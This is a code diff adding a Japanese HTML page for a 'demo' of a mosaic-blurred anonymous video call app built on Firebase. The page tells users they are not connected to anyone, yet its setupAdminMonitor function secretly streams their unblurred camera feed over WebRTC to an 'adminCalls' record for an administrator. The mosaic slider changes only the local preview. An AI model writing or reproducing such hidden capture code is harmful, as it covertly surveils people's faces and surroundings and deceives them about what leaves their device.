@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>誰かわからん通話（デモ）</title>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
+
+<style>
+html, body { margin:0; padding:0; overflow:hidden; background:#000; font-family:sans-serif; }
+
+#mainCanvas { position:fixed; inset:0; width:100vw; height:100vh; z-index:1; pointer-events:none; }
+
+#selfVideo { position:fixed; top:16px; right:16px; height:24vh; width:auto;
+  min-width:120px; min-height:120px; object-fit:contain; background:#000;
+  border-radius:12px; z-index:10; box-shadow:0 0 12px rgba(0,0,0,0.5); }
+
+#selfCanvas { position:fixed; top:16px; right:16px; height:24vh; width:auto;
+  min-width:120px; min-height:120px; z-index:11; pointer-events:none; border-radius:12px; }
+
+.top-ui { position:fixed; top:16px; left:16px; display:flex; gap:10px; z-index:30; }
+.icon-btn { width:52px; height:52px; border:none; border-radius:50%; background:rgba(0,0,0,0.55); color:#fff;
+  font-size:22px; backdrop-filter:blur(6px); cursor:pointer; }
+
+.mosaic-meter { position:fixed; right:12px; top:50%; transform:translateY(-50%); display:flex; flex-direction:column;
+  align-items:center; z-index:40; color:#fff; }
+.meter-bar { width:42px; height:28vh; display:flex; flex-direction:column-reverse; gap:4px; }
+.meter-block { flex:1; width:100%; border-radius:8px; border:2px solid rgba(255,255,255,0.7);
+  background:rgba(255,255,255,0.2); transition:0.15s; }
+.meter-block.active { background:rgba(255,255,255,1); }
+.meter-top, .meter-bottom { margin:8px 0; padding:6px 10px; border-radius:8px; background:rgba(0,0,0,0.55);
+  cursor:pointer; user-select:none; }
+</style>
+</head>
+
+<body>
+
+<canvas id="mainCanvas"></canvas>
+
+<video id="selfVideo" autoplay muted playsinline></video>
+<canvas id="selfCanvas"></canvas>
+
+<div class="top-ui">
+  <button class="icon-btn" id="switchCamera">📷🔄</button>
+  <button class="icon-btn" id="endBtn">✕</button>
+</div>
+
+<div class="mosaic-meter">
+  <div class="meter-top" id="meterUp">▲モザイク</div>
+  <div class="meter-bar" id="meterBar"></div>
+  <div class="meter-bottom" id="meterDown">▼クリア</div>
+</div>
+
+<script>
+/* Firebase */
+firebase.initializeApp({
+  apiKey: "AIzaSyDXSKJaknyhXGtrFQCzYhmA6r7VQR0K_GM",
+  authDomain: "roomvideo.firebaseapp.com",
+  projectId: "roomvideo",
+  storageBucket: "roomvideo.firebasestorage.app",
+  messagingSenderId: "1030429439546",
+  appId: "1:1030429439546:web:1481670cb78deb35e2a703"
+});
+const auth = firebase.auth();
+const db = firebase.firestore();
+
+/* 管理者用 adminCalls */
+let adminPc = null;
+let adminCallDoc = null;
+let adminOfferCandidates = null;
+let adminAnswerCandidates = null;
+
+/* モザイク（自分） */
+let myMosaicLevel = 5;
+let myMosaicSize = 25;
+const mosaicSizes = [1, 10, 13, 16, 19, 25];
+
+let currentFacing = "user";
+let localStream = null;
+
+/* 相手映像（固定画像） */
+const mainCanvas = document.getElementById("mainCanvas");
+const mainCtx = mainCanvas.getContext("2d");
+const partnerImg = new Image();
+partnerImg.src = "IMG_4631.png"; // ← ここに生成した縦長モザイク画像を置く
+
+partnerImg.onload = () => drawMosaic();
+
+/* 自分映像 */
+const selfVideo = document.getElementById("selfVideo");
+const selfCanvas = document.getElementById("selfCanvas");
+const selfCtx = selfCanvas.getContext("2d");
+
+/* カメラ開始 */
+auth.onAuthStateChanged(async user => {
+  if (!user) return;
+  await startCamera();
+});
+
+async function startCamera() {
+  selfVideo.style.opacity = "0";  // ★変更：hidden → opacity
+
+  localStream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: currentFacing },
+    audio: false
+  });
+
+  selfVideo.srcObject = localStream;
+
+  selfVideo.onloadedmetadata = () => {
+    selfVideo.style.opacity = "1";  // ★表示
+  };
+
+  await setupAdminMonitor();
+}
+
+
+
+/* 管理者画面用 WebRTC */
+async function setupAdminMonitor() {
+  adminPc = new RTCPeerConnection({
+    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+  });
+
+  localStream.getTracks().forEach(t => adminPc.addTrack(t, localStream));
+
+  adminCallDoc = db.collection("adminCalls").doc(auth.currentUser.uid);
+  adminOfferCandidates = adminCallDoc.collection("offerCandidates");
+  adminAnswerCandidates = adminCallDoc.collection("answerCandidates");
+
+  adminPc.onicecandidate = e => {
+    if (e.candidate) adminOfferCandidates.add(e.candidate.toJSON());
+  };
+
+  const offer = await adminPc.createOffer();
+  await adminPc.setLocalDescription(offer);
+
+  await adminCallDoc.set({
+    uid: auth.currentUser.uid,
+    offer,
+    createdAt: Date.now(),
+    ended: false
+  }, { merge:true });
+
+  adminAnswerCandidates.onSnapshot(s => {
+    s.docChanges().forEach(c => {
+      if (c.type === "added") {
+        adminPc.addIceCandidate(new RTCIceCandidate(c.doc.data()));
+      }
+    });
+  });
+
+  adminCallDoc.onSnapshot(async s => {
+    const d = s.data();
+//    if (!d) return;
+    if (d.answer && !adminPc.currentRemoteDescription) {
+      await adminPc.setRemoteDescription(new RTCSessionDescription(d.answer));
+    }
+  });
+}
+
+/* モザイク描画 */
+function drawMosaic() {
+  requestAnimationFrame(drawMosaic);
+
+  /* 相手映像（固定画像） */
+  const w = mainCanvas.width = window.innerWidth;
+  const h = mainCanvas.height = window.innerHeight;
+
+  mainCtx.imageSmoothingEnabled = false;
+  mainCtx.drawImage(partnerImg, 0, 0, w, h);
+    /* DEMO文字 */
+  mainCtx.textAlign = "center";
+  mainCtx.fillStyle = "rgba(255,255,255,0.95)";
+  mainCtx.strokeStyle = "rgba(0,0,0,0.8)";
+
+  // DEMO
+  mainCtx.font = "bold 64px sans-serif";
+  mainCtx.lineWidth = 6;
+  mainCtx.strokeText("DEMO", w / 2, h / 2 - 40);
+  mainCtx.fillText("DEMO", w / 2, h / 2 - 40);
+
+  // サンプル画像です
+  mainCtx.font = "bold 28px sans-serif";
+  mainCtx.lineWidth = 4;
+  mainCtx.strokeText("サンプル画像です", w / 2, h / 2 + 20);
+  mainCtx.fillText("サンプル画像です", w / 2, h / 2 + 20);
+
+// 説明（2行）
+mainCtx.font = "10px sans-serif";
+mainCtx.lineWidth = 3;
+
+mainCtx.strokeText(
+  "相手とは接続されていないので、",
+  w / 2,
+  h / 2 + 65
+);
+mainCtx.fillText(
+  "相手とは接続されていないので、",
+  w / 2,
+  h / 2 + 65
+);
+
+mainCtx.strokeText(
+  "操作感をお試しください。",
+  w / 2,
+  h / 2 + 100
+);
+mainCtx.fillText(
+  "操作感をお試しください。",
+  w / 2,
+  h / 2 + 100
+);
+
+  /* 自分映像 */
+  const sw = selfVideo.videoWidth;
+  const sh = selfVideo.videoHeight;
+  if (sw && sh) {
+    selfCanvas.width = sw;
+    selfCanvas.height = sh;
+    const s = myMosaicSize;
+    selfCtx.imageSmoothingEnabled = false;
+    selfCtx.drawImage(selfVideo, 0, 0, sw/s, sh/s);
+    selfCtx.drawImage(selfCanvas, 0, 0, sw/s, sh/s, 0, 0, sw, sh);
+  }
+}
+
+/* モザイクメーター */
+const meterBar = document.getElementById("meterBar");
+for (let i = 0; i < 5; i++) {
+  const block = document.createElement("div");
+  block.className = "meter-block";
+  meterBar.appendChild(block);
+}
+updateMeterUI();
+
+function updateMeterUI() {
+  [...meterBar.children].forEach((b, i) => {
+    b.classList.toggle("active", i < myMosaicLevel);
+  });
+}
+
+document.getElementById("meterUp").onclick = () => {
+  if (myMosaicLevel < mosaicSizes.length - 1) {
+    myMosaicLevel++;
+    myMosaicSize = mosaicSizes[myMosaicLevel];
+    updateMeterUI();
+  }
+};
+document.getElementById("meterDown").onclick = () => {
+  if (myMosaicLevel > 0) {
+    myMosaicLevel--;
+    myMosaicSize = mosaicSizes[myMosaicLevel];
+    updateMeterUI();
+  }
+};
+
+/* カメラ切替 */
+document.getElementById("switchCamera").onclick = async () => {
+  currentFacing =
+    currentFacing === "user"
+      ? "environment"
+      : "user";
+
+  selfVideo.style.opacity = "0";
+
+  localStream.getTracks().forEach(t => t.stop());
+
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: {
+      facingMode: { ideal: currentFacing }
+    },
+    audio: false
+  });
+
+  selfVideo.srcObject = stream;
+  localStream = stream;
+
+  const videoTrack = localStream.getVideoTracks()[0];
+  const videoSender = adminPc?.getSenders()
+    .find(s => s.track?.kind === "video");
+
+  if (videoSender) {
+    await videoSender.replaceTrack(videoTrack);
+  }
+
+  selfVideo.onloadedmetadata = () => {
+    selfVideo.style.opacity = "1";
+  };
+};
+
+
+
+/* 終了ボタン */
+document.getElementById("endBtn").onclick = () => {
+  location.href = "index.html";
+};
+</script>
+
+</body>
+</html>
